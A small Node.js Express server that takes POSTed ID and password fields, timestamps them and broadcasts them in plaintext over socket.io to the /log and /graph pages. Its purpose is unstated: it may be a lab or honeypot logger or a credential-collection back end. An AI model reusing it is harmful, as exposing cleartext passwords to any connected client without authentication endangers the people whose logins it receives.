
var express = require('express');
var app = express();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var bodyParser = require('body-parser');
var moment = require('moment');

app.use(express.static('public'));

app.use(bodyParser.urlencoded({extended:true}));
app.use(bodyParser.json());

app.get('/log', function(req, res) {
    res.sendFile(__dirname + '/public/log.html');
});

app.post('/log', function(req, res) {
    var time = moment().format('YYYY-MM-DD HH:mm:ss');
    var data = "ID=" + req.body.id + ", Pass=" + req.body.Pass;
    var log = '[' + time + ']' + ' ' + data;
    io.emit('logging', log);
    res.end();
});

app.get('/graph', function(req, res) {
    res.sendFile(__dirname + '/public/graph.html');
});

app.post('/graph', function(req, res) {
    var time = moment().format('YYYY-MM-DD HH:mm:ss');
    var data = "ID=" + req.body.id + ", Pass=" + req.body.Pass;
    var log = '[' + time + ']' + ' ' + data;
    io.emit('graph', log);
});

io.on('connection', function(socket) {

});

http.listen(8080, function() {
    console.log('listening on *:8080');
});
